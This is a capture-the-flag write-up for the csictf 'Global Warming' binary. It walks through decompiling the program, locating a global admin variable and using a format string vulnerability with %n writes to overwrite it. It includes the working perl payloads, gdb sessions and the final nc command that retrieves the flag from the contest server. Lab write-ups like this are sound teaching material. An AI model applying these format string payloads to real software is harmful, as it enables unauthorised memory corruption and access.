
# Global Warming

## Description

Greta Thunberg 1 Administration 0

```
nc chall.csivit.com 30023
```

## Analysis

Decompile with Ghidra. `main()` just accepts some input and passes it into `login()`:

```c
undefined4 main(void)
{
  char local_410 [1024];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  fgets(local_410,0x400,stdin);
  login(&DAT_0804a030,local_410);
  return 0;
}
```

`login()` passes our input directly into `printf()`... and this is important because it's vulnerable to format string attacks. Then it compares a global variable called `admin` to `0xb4dbabe3` (same thing as `-0x4b24541d`) and gives us the flag if true:

```c
void login(undefined4 param_1,char *param_2)
{
  printf(param_2);
  if (admin == -0x4b24541d) {
    system("cat flag.txt");
  }
  else {
    printf("You cannot login as admin.");
  }
  return;
}
```

In other words, We should be able to write `0xb4dbabe3` to `admin` through a format string attack. Here's the address of the variable we want to write:

```
kali@kali:~/Downloads$ objdump -D global-warming | grep -A2 admin
0804c02c <admin>:
 804c02c:       00 00                   add    %al,(%eax)
        ...
```

So to start with, we can print that address, then print a bunch of words from the stack to find its offset.

```
kali@kali:~/Downloads$ perl -e 'print "\x2c\xc0\x04\x08%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x "' | ./global-warming 
,f7f432c0.fbad2087.080491b2.f7f0d000.0804c000.ff900eb8.08049297.0804a030.ff900ab0.f7f0d580.08049219.0804c02c You cannot login as admin.
```

That's an offset of 12, which we can print with:

```
kali@kali:~/Downloads$ perl -e 'print "\x2c\xc0\x04\x08 %12\$p "' | ./global-warming 
, 0x804c02c You cannot login as admin.
```

And we might have to write this a character at a time, so let's queue up the other 3 addresses for this 4-byte word.

```
kali@kali:~/Downloads$ perl -e 'print "\x2c\xc0\x04\x08\x2d\xc0\x04\x08\x2e\xc0\x04\x08\x2f\xc0\x04\x08 %12\$p %13\$p %14\$p %15\$p"' | ./global-warming
,-./ 0x804c02c 0x804c02d 0x804c02e 0x804c02fYou cannot login as admin.
```

Now we need to use `gdb` to set a breakpoint on the comparison at `0x080491cc` to see how we manipulate the value in `eax`.

```
gef➤  disas login
Dump of assembler code for function login:
   0x080491a6 <+0>:     push   ebp
   0x080491a7 <+1>:     mov    ebp,esp
   0x080491a9 <+3>:     push   ebx
   0x080491aa <+4>:     sub    esp,0x4
   0x080491ad <+7>:     call   0x80490e0 <__x86.get_pc_thunk.bx>
   0x080491b2 <+12>:    add    ebx,0x2e4e
   0x080491b8 <+18>:    sub    esp,0xc
   0x080491bb <+21>:    push   DWORD PTR [ebp+0xc]
   0x080491be <+24>:    call   0x8049050 <printf@plt>
   0x080491c3 <+29>:    add    esp,0x10
   0x080491c6 <+32>:    mov    eax,DWORD PTR [ebx+0x2c]
   0x080491cc <+38>:    cmp    eax,0xb4dbabe3
   0x080491d1 <+43>:    jne    0x80491e7 <login+65>
   0x080491d3 <+45>:    sub    esp,0xc
   0x080491d6 <+48>:    lea    eax,[ebx-0x1ff8]
   0x080491dc <+54>:    push   eax
   0x080491dd <+55>:    call   0x8049070 <system@plt>
   0x080491e2 <+60>:    add    esp,0x10
   0x080491e5 <+63>:    jmp    0x80491f9 <login+83>
   0x080491e7 <+65>:    sub    esp,0xc
   0x080491ea <+68>:    lea    eax,[ebx-0x1feb]
   0x080491f0 <+74>:    push   eax
   0x080491f1 <+75>:    call   0x8049050 <printf@plt>
   0x080491f6 <+80>:    add    esp,0x10
   0x080491f9 <+83>:    nop
   0x080491fa <+84>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491fd <+87>:    leave  
   0x080491fe <+88>:    ret    
End of assembler dump.
gef➤  break *0x080491cc
Breakpoint 2 at 0x80491cc
```

We can use the `%n` formatter to write to the address at the beginning of the string. It took some trial-and-error to get the value right, but `%.43985d` adds just enough characters to write `0xabe3` into `0x804c02c`.

```
kali@kali:~/Downloads$ perl -e 'print "\x2c\xc0\x04\x08\x2d\xc0\x04\x08\x2e\xc0\x04\x08\x2f\xc0\x04\x08 %.43985d%12\$n"' > global-pwning.txt 
```

See the value of `eax` at our breakpoint:

```
gef➤  r < global-pwning.txt
Starting program: /home/kali/Downloads/global-warming < global-pwning.txt

Breakpoint 2, 0x080491cc in login ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xabe3    
$ebx   : 0x0804c000  →  0x0804bf00  →  0x00000001
$ecx   : 0xffffffff
$edx   : 0xbe3     
$esp   : 0xffffca90  →  0xf7fb3000  →  0x001dfd6c
$ebp   : 0xffffca98  →  0xffffceb8  →  0x00000000
$esi   : 0xf7fb3000  →  0x001dfd6c
$edi   : 0xf7fb3000  →  0x001dfd6c
$eip   : 0x080491cc  →  <login+38> cmp eax, 0xb4dbabe3
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffca90│+0x0000: 0xf7fb3000  →  0x001dfd6c    ← $esp
0xffffca94│+0x0004: 0x0804c000  →  0x0804bf00  →  0x00000001
0xffffca98│+0x0008: 0xffffceb8  →  0x00000000    ← $ebp
0xffffca9c│+0x000c: 0x08049297  →  <main+152> add esp, 0x10
0xffffcaa0│+0x0010: 0x0804a030  →  "User"
0xffffcaa4│+0x0014: 0xffffcab0  →  0x0804c02c  →  0x0000abe3
0xffffcaa8│+0x0018: 0xf7fb3580  →  0xfbad209b
0xffffcaac│+0x001c: 0x08049219  →  <main+26> add ebx, 0x2de7
─────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80491be <login+24>       call   0x8049050 <printf@plt>
    0x80491c3 <login+29>       add    esp, 0x10
    0x80491c6 <login+32>       mov    eax, DWORD PTR [ebx+0x2c]
 →  0x80491cc <login+38>       cmp    eax, 0xb4dbabe3
    0x80491d1 <login+43>       jne    0x80491e7 <login+65>
    0x80491d3 <login+45>       sub    esp, 0xc
    0x80491d6 <login+48>       lea    eax, [ebx-0x1ff8]
    0x80491dc <login+54>       push   eax
    0x80491dd <login+55>       call   0x8049070 <system@plt>
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "global-warming", stopped 0x80491cc in login (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80491cc → login()
[#1] 0x8049297 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

## Solution

We're almost there, now we just have to write the next 2 bytes with the value `0xb4db`. A little more trial-and-error to find the right value gives us `%.2294d`. We write the value to `0x804c02c`.

```
kali@kali:~/Downloads$ perl -e 'print "\x2c\xc0\x04\x08\x2d\xc0\x04\x08\x2e\xc0\x04\x08\x2f\xc0\x04\x08 %.43985d%12\$n %.2294d%14\$n"' > global-pwning.txt
```

See the value of `eax` at our breakpoint:

```
gef➤  r < global-pwning.txt
Starting program: /home/kali/Downloads/global-warming < global-pwning.txt

Breakpoint 2, 0x080491cc in login ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb4dbabe3
$ebx   : 0x0804c000  →  0x0804bf00  →  0x00000001
$ecx   : 0xffffffff
$edx   : 0x14db    
$esp   : 0xffffca90  →  0xf7fb3000  →  0x001dfd6c
$ebp   : 0xffffca98  →  0xffffceb8  →  0x00000000
$esi   : 0xf7fb3000  →  0x001dfd6c
$edi   : 0xf7fb3000  →  0x001dfd6c
$eip   : 0x080491cc  →  <login+38> cmp eax, 0xb4dbabe3
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffca90│+0x0000: 0xf7fb3000  →  0x001dfd6c    ← $esp
0xffffca94│+0x0004: 0x0804c000  →  0x0804bf00  →  0x00000001
0xffffca98│+0x0008: 0xffffceb8  →  0x00000000    ← $ebp
0xffffca9c│+0x000c: 0x08049297  →  <main+152> add esp, 0x10
0xffffcaa0│+0x0010: 0x0804a030  →  "User"
0xffffcaa4│+0x0014: 0xffffcab0  →  0x0804c02c  →  0xb4dbabe3
0xffffcaa8│+0x0018: 0xf7fb3580  →  0xfbad209b
0xffffcaac│+0x001c: 0x08049219  →  <main+26> add ebx, 0x2de7
─────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80491be <login+24>       call   0x8049050 <printf@plt>
    0x80491c3 <login+29>       add    esp, 0x10
    0x80491c6 <login+32>       mov    eax, DWORD PTR [ebx+0x2c]
 →  0x80491cc <login+38>       cmp    eax, 0xb4dbabe3
    0x80491d1 <login+43>       jne    0x80491e7 <login+65>
    0x80491d3 <login+45>       sub    esp, 0xc
    0x80491d6 <login+48>       lea    eax, [ebx-0x1ff8]
    0x80491dc <login+54>       push   eax
    0x80491dd <login+55>       call   0x8049070 <system@plt>
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "global-warming", stopped 0x80491cc in login (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80491cc → login()
[#1] 0x8049297 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

After continuing, it passes the comparison and gives us the flag!

```
gef➤  c
Continuing.
[Detaching after vfork from child process 374101]
flag
[Inferior 1 (process 374099) exited normally]
gef➤
```

Now run this exploit against the remote server to get the real flag:

```
kali@kali:~/Downloads$ perl -e 'print "\x2c\xc0\x04\x08\x2d\xc0\x04\x08\x2e\xc0\x04\x08\x2f\xc0\x04\x08 %.43985d%12\$n %.2294d%14\$n\n"' | nc chall.csivit.com 30023 | tail -1
csictf{n0_5tr1ng5_@tt@ch3d}
```

